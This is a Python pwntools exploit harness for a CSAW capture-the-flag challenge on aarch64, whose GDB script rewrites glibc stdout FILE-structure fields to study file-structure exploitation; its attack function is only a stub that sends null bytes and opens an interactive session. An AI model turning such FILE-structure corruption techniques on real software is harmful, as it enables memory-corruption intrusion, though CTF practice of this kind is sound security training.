#!/usr/bin/env python3
from contextlib import contextmanager
from pwn import *
import os, shlex, subprocess, tempfile

FILE = "./chal1"
QEMU = "/usr/bin/qemu-aarch64"
QEMU_SYSROOT = "/home/massi/csaw"
GDB_MULTI = "/usr/bin/gdb-multiarch"
GDB_PORT = 1234

HOST, PORT = "chals.ctf.csaw.io", 21003

context.log_level = "debug"
context.arch = "aarch64"
context.os = "linux"
context.endian = "little"
context.terminal = ['tmux', 'split-window', '-h']

GDBSCRIPT = (
    "set confirm off\n"
    f"file {FILE}\n"
    f"target remote :{GDB_PORT}\n"
    f"b * read\n"
    f"c\n"
    f"b * exit\n"
    f"add-symbol-file /home/massi/csaw/faketypes.o 0x0\n"
    f"c\n"
    f"c\n"
    f"set (* (struct _IO_FILE *)&_IO_2_1_stdout_)->_flags = 0x800\n"
    f"set (* (struct _IO_FILE *)&_IO_2_1_stdout_)->_IO_write_ptr = (((long)&_IO_2_1_stdout_) + 132)\n"
    f"set (* (struct _IO_FILE *)&_IO_2_1_stdout_)->_IO_write_base = 1\n"
    f"set (* (struct _IO_FILE *)&_IO_2_1_stdout_)->_mode = 0\n"
    f"set (* (struct _IO_FILE *)&_IO_2_1_stdout_)->_wide_data = (((long)&_IO_2_1_stdout_) + 0x8)\n"
    f"set (* (struct _IO_FILE *)&_IO_2_1_stdout_)->_offset = (((long)&_IO_2_1_stdout_) + 0x20)\n"
    f"set ((struct _IO_wide_data)(* (struct _IO_FILE *)&_IO_2_1_stdout_)->_wide_data)->_IO_write_base = ((struct _IO_FILE*)&_IO_2_1_stdout_)->_IO_write_base\n"
    f"set ((struct _IO_wide_data)(* (struct _IO_FILE *)&_IO_2_1_stdout_)->_wide_data)->_IO_write_ptr = ((struct _IO_FILE*)&_IO_2_1_stdout_)->_IO_write_ptr\n"
    
    f"set $std = (* (struct _IO_FILE_plus *)&_IO_2_1_stdout_)\n"
    f"set $vtable= *((* (struct _IO_FILE_plus*) &_IO_2_1_stdout_)->vtable)\n"
    f"set $wd= ((struct _IO_wide_data)(* (struct _IO_FILE *)&_IO_2_1_stdout_)->_wide_data)\n"
    
    f"b * ((long)exit + 0x3c27c)\n"
    f"b * ((long)exit + 0x3c2bc)\n"
)

@contextmanager
def launch(local=True, debug=True, aslr=False, argv=None, envp=None, use_qemu=True):
    target = None
    qemu_proc = None
    tmp_gdbfile = None
    try:
        if local:
            global elf
            elf = ELF(FILE)
            context.binary = elf

            if use_qemu:
                qemu_args = [QEMU, "-L", QEMU_SYSROOT, "-g", str(GDB_PORT), FILE] + (argv or [])
                qemu_proc = process(qemu_args, env=envp, cwd=".")

                if debug:
                    with tempfile.NamedTemporaryFile('w', delete=False) as f:
                        f.write(GDBSCRIPT)
                        tmp_gdbfile = f.name
                    gdb_base = [GDB_MULTI, "-q", "-x", tmp_gdbfile]
                    if os.environ.get("TMUX"):
                        print("Launching gdb in a new tmux pane...")
                        gdb_cmd = " ".join(shlex.quote(a) for a in gdb_base)
                        subprocess.check_call(['tmux', 'split-window', '-h', gdb_cmd])
                    else:
                        subprocess.Popen(gdb_base)

                target = qemu_proc
            else:
                if debug:
                    target = gdb.debug([elf.path] + (argv or []), gdbscript=GDBSCRIPT, aslr=aslr, env=envp)
                else:
                    target = process([elf.path] + (argv or []), env=envp)
        else:
            target = remote(HOST, PORT)

        yield target
    finally:
        for p in (target, qemu_proc):
            if p:
                try: p.close()
                except: pass
        if tmp_gdbfile and os.path.exists(tmp_gdbfile):
            try: os.unlink(tmp_gdbfile)
            except: pass


def attack(io):
    # LAST_NIBBLE = 0x1510

    NEXT_NIBBLE = io.recv(0x2)
    print(NEXT_NIBBLE.hex())
    io.send(b"\0"*0x40)
    io.send(b"\0"*0x40)
    io.interactive()
    
    
def main():
    with launch(local=True, debug=True, aslr=False, argv=None, envp=os.environ, use_qemu=True) as io:
        attack(io)

if __name__ == "__main__":
    main()